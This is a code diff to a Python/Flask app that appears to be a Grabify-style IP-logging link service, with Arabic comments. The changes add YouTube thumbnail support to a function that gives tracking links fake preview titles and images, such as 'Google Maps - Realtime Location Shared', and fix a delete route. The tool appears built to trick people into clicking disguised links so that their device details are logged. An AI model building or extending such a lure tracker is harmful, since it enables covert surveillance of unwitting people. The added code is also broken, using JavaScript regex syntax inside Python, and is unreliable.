@@ -4,6 +4,7 @@ import datetime
 import sqlite3
 import requests
 import pytz
+import re
 from functools import wraps
 from user_agents import parse
 
@@ -83,6 +84,7 @@ def fetch_original_meta(url, manual_thumb_url=None):
     title = "Watch Trending Video Content in HD Quality"
     img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
     
+    # 1. إذا قام المستخدم بإدخال رابط صورة يدوياً (للمنصات الصعبة مثل فيسبوك وتيك توك وإنستغرام)
     if manual_thumb_url and manual_thumb_url.strip():
         img_final = manual_thumb_url.strip()
         if img_final.startswith('http://'):
@@ -96,7 +98,33 @@ def fetch_original_meta(url, manual_thumb_url=None):
             title = "TikTok Video Content Player"
         return title, img_final
         
-    if "goo.gl/maps" in url_lower or "maps.google" in url_lower:
+    # 2. معالجة روابط يوتيوب تلقائياً (توليد الصورة المصغرة عبر الـ Video ID مباشرة)
+    if "youtube.com" in url_lower or "youtu.be" in url_lower:
+        title = "YouTube Video Stream Player HD"
+        video_id = None
+        
+        # استخراج المعرف من روابط youtu.be/XXXX
+        if "youtu.be/" in url_lower:
+            parts = url.split("youtu.be/")
+            if len(parts) > 1:
+                video_id = parts[1].split(/[?#]/)[0]
+        # استخراج المعرف من روابط youtube.com/watch?v=XXXX
+        elif "v=" in url_lower:
+            match = re.search(r"[?&]v=([^&#]+)", url)
+            if match:
+                video_id = match.group(1)
+        # استخراج المعرف من روابط الشورتس youtube.com/shorts/XXXX
+        elif "shorts/" in url_lower:
+            parts = url.split("shorts/")
+            if len(parts) > 1:
+                video_id = parts[1].split(/[?#]/)[0]
+                
+        if video_id:
+            img = f"https://img.youtube.com/vi/{video_id}/hqdefault.jpg"
+        return title, img
+
+    # 3. معالجة روابط خرائط قوقل تلقائياً
+    if "goo.gl/maps" in url_lower or "maps.google" in url_lower or "maps.app.goo.gl" in url_lower:
         title = "Google Maps - Realtime Location Shared"
         img = "https://images.unsplash.com/photo-1524661135-423995f22d0b?w=600"
         return title, img
@@ -277,7 +305,7 @@ MY_LINKS_LAYOUT = '''
                         <td><a href="/secure/{{ link.id }}" target="_blank">secure/{{ link.id }}</a></td>
                         <td>
                             <a href="/analytics/{{ link.id }}" class="btn-action btn-view">📊 Advanced Logs</a>
-                            <a href="/delete/language/{{ link.id }}" class="btn-action btn-del" onclick="return confirm('Delete?');">🗑️</a>
+                            <a href="/delete/{{ link.id }}" class="btn-action btn-del" onclick="return confirm('Delete?');">🗑️</a>
                         </td>
                     </tr>
                     {% endfor %}
@@ -317,14 +345,12 @@ ANALYTICS_LAYOUT = '''
         .btn-more { background-color: #0088cc; color: white; border: none; padding: 6px 12px; border-radius: 4px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; }
         .btn-more:hover { background-color: #006699; }
 
-        /* تكتيك المنبثقة الذكية المطابقة لـ Grabify Modal */
         .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
         .modal-content { background: white; width: 100%; max-width: 550px; border-radius: 8px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.25); animation: fadeIn 0.3s ease-out; }
         .modal-header { background: #f8fafc; padding: 15px; font-weight: bold; font-size: 16px; border-bottom: 1px solid #e2e8f0; display: flex; justify-content: space-between; align-items: center; color: #0f172a; }
         .modal-close { background: none; border: none; font-size: 20px; cursor: pointer; color: #94a3b8; font-weight: bold; }
         .modal-body { padding: 0; max-height: 80vh; overflow-y: auto; }
         
-        /* جدول البيانات المنبثقة العمودي */
         .modal-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: left; }
         .modal-table tr { border-bottom: 1px solid #f1f5f9; }
         .modal-table tr:last-child { border-bottom: none; }
@@ -422,7 +448,6 @@ ANALYTICS_LAYOUT = '''
     </div>
 
     <script>
-        // تخزين كافة السجلات في مصفوفة جافا سكريبت محلياً للسرعة القصوى عند الفتح وضمان ثبات التناسق
         var logsData = [
             {% for click in clicks_list %}
             {
